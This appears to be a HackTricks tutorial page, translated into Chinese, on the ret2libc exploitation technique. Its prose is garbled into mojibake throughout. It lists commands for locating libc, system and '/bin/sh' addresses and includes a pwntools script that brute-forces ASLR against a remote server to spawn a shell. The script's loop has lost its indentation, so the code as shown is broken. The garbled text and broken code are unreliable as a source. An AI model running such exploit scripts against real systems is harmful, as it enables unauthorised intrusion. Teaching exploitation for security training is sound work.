# Ret2lib

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **åŸºæœ¬ä¿¡æ¯**

**Ret2Libc** çš„æœ¬è´¨æ˜¯å°†æ˜“å—æ”»å‡»ç¨‹åºçš„æ‰§è¡Œæµé‡å®šå‘åˆ°å…±äº«åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œ**system**ã€**execve**ã€**strcpy**ï¼‰ï¼Œè€Œä¸æ˜¯åœ¨æ ˆä¸Šæ‰§è¡Œæ”»å‡»è€…æä¾›çš„ shellcodeã€‚æ”»å‡»è€…æ„é€ ä¸€ä¸ªæœ‰æ•ˆè½½è·ï¼Œä¿®æ”¹æ ˆä¸Šçš„è¿”å›åœ°å€ä»¥æŒ‡å‘æ‰€éœ€çš„åº“å‡½æ•°ï¼ŒåŒæ—¶ç¡®ä¿æ ¹æ®è°ƒç”¨çº¦å®šæ­£ç¡®è®¾ç½®ä»»ä½•å¿…è¦çš„å‚æ•°ã€‚

### **ç¤ºä¾‹æ­¥éª¤ï¼ˆç®€åŒ–ï¼‰**

* è·å–è¦è°ƒç”¨çš„å‡½æ•°çš„åœ°å€ï¼ˆä¾‹å¦‚ systemï¼‰å’Œè¦è°ƒç”¨çš„å‘½ä»¤ï¼ˆä¾‹å¦‚ /bin/shï¼‰
* ç”Ÿæˆä¸€ä¸ª ROP é“¾ï¼Œä»¥å°†ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å‘å‘½ä»¤å­—ç¬¦ä¸²ï¼Œå¹¶å°†æ‰§è¡Œæµä¼ é€’ç»™è¯¥å‡½æ•°

## æŸ¥æ‰¾åœ°å€

* å‡è®¾ä½¿ç”¨çš„ `libc` æ˜¯å½“å‰æœºå™¨ä¸Šçš„ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰¾åˆ°å®ƒåœ¨å†…å­˜ä¸­çš„åŠ è½½ä½ç½®ï¼š 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

å¦‚æœä½ æƒ³æ£€æŸ¥ASLRæ˜¯å¦åœ¨æ”¹å˜libcçš„åœ°å€ï¼Œä½ å¯ä»¥è¿™æ ·åšï¼š
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* çŸ¥é“ä½¿ç”¨çš„libcåï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰¾åˆ°`system`å‡½æ•°çš„åç§»ï¼š
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* çŸ¥é“ä½¿ç”¨çš„libcåï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰¾åˆ°å­—ç¬¦ä¸²`/bin/sh`å‡½æ•°çš„åç§»ï¼š
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### ä½¿ç”¨ gdb-peda / GEF

çŸ¥é“ä½¿ç”¨çš„ libc åï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Peda æˆ– GEF è·å– **system** å‡½æ•°ã€**exit** å‡½æ•°å’Œå­—ç¬¦ä¸² **`/bin/sh`** çš„åœ°å€ï¼š
```
p system
p exit
find "/bin/sh"
```
### ä½¿ç”¨ /proc/\<PID>/maps

å¦‚æœè¿›ç¨‹åœ¨æ¯æ¬¡ä¸å…¶äº¤äº’æ—¶éƒ½åœ¨åˆ›å»º**å­è¿›ç¨‹**ï¼ˆç½‘ç»œæœåŠ¡å™¨ï¼‰ï¼Œè¯·å°è¯•**è¯»å–**è¯¥æ–‡ä»¶ï¼ˆå¯èƒ½éœ€è¦ä»¥rootèº«ä»½è¿è¡Œï¼‰ã€‚

åœ¨è¿™é‡Œä½ å¯ä»¥æ‰¾åˆ°**libcåœ¨è¿›ç¨‹ä¸­åŠ è½½çš„ç¡®åˆ‡ä½ç½®**ä»¥åŠ**æ¯ä¸ªå­è¿›ç¨‹å°†è¦åŠ è½½çš„ä½ç½®**ã€‚

![](<../../../../.gitbook/assets/image (95).png>)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒåŠ è½½åœ¨**0xb75dc000**ï¼ˆè¿™å°†æ˜¯libcçš„åŸºåœ°å€ï¼‰

## æœªçŸ¥çš„libc

å¯èƒ½ä½ **ä¸çŸ¥é“äºŒè¿›åˆ¶æ–‡ä»¶åŠ è½½çš„libc**ï¼ˆå› ä¸ºå®ƒå¯èƒ½ä½äºä½ æ²¡æœ‰è®¿é—®æƒé™çš„æœåŠ¡å™¨ä¸Šï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥åˆ©ç”¨æ¼æ´**æ³„éœ²ä¸€äº›åœ°å€å¹¶æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨çš„libc**åº“ï¼š

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªpwntoolsæ¨¡æ¿ï¼š

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## ç»•è¿‡32ä½çš„ASLR

è¿™äº›æš´åŠ›æ”»å‡»**ä»…å¯¹32ä½ç³»ç»Ÿæœ‰ç”¨**ã€‚

* å¦‚æœåˆ©ç”¨æ˜¯æœ¬åœ°çš„ï¼Œä½ å¯ä»¥å°è¯•æš´åŠ›ç ´è§£libcçš„åŸºåœ°å€ï¼ˆå¯¹32ä½ç³»ç»Ÿæœ‰ç”¨ï¼‰ï¼š
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* å¦‚æœæ”»å‡»è¿œç¨‹æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥å°è¯• **æš´åŠ›ç ´è§£ `libc` å‡½æ•° `usleep` çš„åœ°å€**ï¼Œä¼ é€’å‚æ•° 10ï¼ˆä¾‹å¦‚ï¼‰ã€‚å¦‚æœåœ¨æŸä¸ªæ—¶åˆ» **æœåŠ¡å™¨å“åº”å¤šäº† 10 ç§’**ï¼Œæ‚¨æ‰¾åˆ°äº†è¿™ä¸ªå‡½æ•°çš„åœ°å€ã€‚

## One Gadget

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib ä»£ç ç¤ºä¾‹

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼ŒASLR æš´åŠ›ç ´è§£é›†æˆåœ¨ä»£ç ä¸­ï¼Œæ˜“å—æ”»å‡»çš„äºŒè¿›åˆ¶æ–‡ä»¶ä½äºè¿œç¨‹æœåŠ¡å™¨ä¸Šï¼š
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib ä»£ç ç¤ºä¾‹

æŸ¥çœ‹ç¤ºä¾‹æ¥è‡ªï¼š

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (æˆ– puts)

è¿™å…è®¸é€šè¿‡è°ƒç”¨ `printf`/`puts` å¹¶å°†ä¸€äº›ç‰¹å®šæ•°æ®ä½œä¸ºå‚æ•°æ¥**æ³„éœ²è¿›ç¨‹ä¸­çš„ä¿¡æ¯**ã€‚

## Ret2printf

è¿™åŸºæœ¬ä¸Šæ„å‘³ç€æ»¥ç”¨**Ret2lib å°†å…¶è½¬å˜ä¸º `printf` æ ¼å¼å­—ç¬¦ä¸²æ¼æ´**ï¼Œé€šè¿‡ä½¿ç”¨ `ret2lib` è°ƒç”¨ printf ä»¥åˆ©ç”¨å®ƒï¼ˆå¬èµ·æ¥æ²¡ç”¨ä½†å¯èƒ½ï¼‰ï¼š

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## å…¶ä»–ç¤ºä¾‹å’Œå‚è€ƒ

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2libï¼Œç»™å‡º libc ä¸­ä¸€ä¸ªå‡½æ•°çš„åœ°å€æ³„éœ²ï¼Œä½¿ç”¨ä¸€ä¸ª gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 ä½ï¼Œå¯ç”¨ ASLR ä½†æ²¡æœ‰ PIEï¼Œç¬¬ä¸€æ­¥æ˜¯å¡«å……æº¢å‡ºç›´åˆ° canary çš„å­—èŠ‚ 0x00ï¼Œç„¶åè°ƒç”¨ puts å¹¶æ³„éœ²å®ƒã€‚ä½¿ç”¨ canary åˆ›å»ºä¸€ä¸ª ROP gadget æ¥è°ƒç”¨ puts ä»¥æ³„éœ² GOT ä¸­ puts çš„åœ°å€ï¼Œç„¶åè°ƒç”¨ `system('/bin/sh')` çš„ ROP gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 ä½ï¼Œå¯ç”¨ ASLRï¼Œæ²¡æœ‰ canaryï¼Œä¸»å‡½æ•°ä¸­çš„å †æ ˆæº¢å‡ºæ¥è‡ªå­å‡½æ•°ã€‚ROP gadget è°ƒç”¨ puts ä»¥æ³„éœ² GOT ä¸­ puts çš„åœ°å€ï¼Œç„¶åè°ƒç”¨ä¸€ä¸ª gadgetã€‚
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 ä½ï¼Œæ²¡æœ‰ pieï¼Œæ²¡æœ‰ canaryï¼Œæ²¡æœ‰ relroï¼Œnxã€‚ä½¿ç”¨ write å‡½æ•°æ³„éœ² writeï¼ˆlibcï¼‰çš„åœ°å€å¹¶è°ƒç”¨ä¸€ä¸ª gadgetã€‚

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
